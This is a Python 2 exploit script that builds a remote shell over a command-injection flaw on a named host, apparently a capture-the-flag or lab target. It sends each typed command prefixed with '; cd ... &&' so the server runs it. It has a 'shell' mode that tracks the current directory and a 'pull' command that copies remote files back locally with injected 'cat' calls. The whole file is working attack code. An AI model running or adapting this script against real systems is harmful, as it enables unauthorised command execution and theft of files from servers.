import socket
import re
host = "cornerstoneairlines.co" 
port = 45 
curr_path ="/"

def execute_cmd():
    global curr_path
    while True:
        command = raw_input(curr_path+">").strip()   
        if command == "exit":
            return 
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        data = s.recv(1024)
        
        

        if command.startswith("cd"):        
            output = "; cd "+curr_path+" && "+command+ " && pwd"     
            s.send(output+"\n")
            data = s.recv(1024).strip()
            if len(data) != 0:
                curr_path= data
        
        elif len(command.strip()) !=0:
            output = "; cd "+curr_path+ " &&"+command   
            s.send(output+"\n")
            print(s.recv(1024).strip())
        else: 
            pass



if __name__ == '__main__':
    while True:
        
        command = raw_input(">").strip()
    
        if len(command) == 0:
            pass
        elif command == "shell":
            execute_cmd()
            
        elif command == "quit":
            exit()
        elif command.startswith("pull") and len(command.split()) == 3: 
            p = command.split()
            remote = p[1]
            local = p[2]
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            data = s.recv(1024)
            output = "; cat "+ remote 
            s.send(output+"\n")
            download = s.recv(1024)
            with open(local,"w+") as down:
                down.write(download)

        else:
            print("""
                     1)  shell                              Drop into an interactive shell and allow 
                                                            users to gracefully `exit`
                     2)  pull <remote-path> <local-path>    Download files
                     3)  help                               Shows this help menu
                     4)  quit                               Quit the shell 
            """)



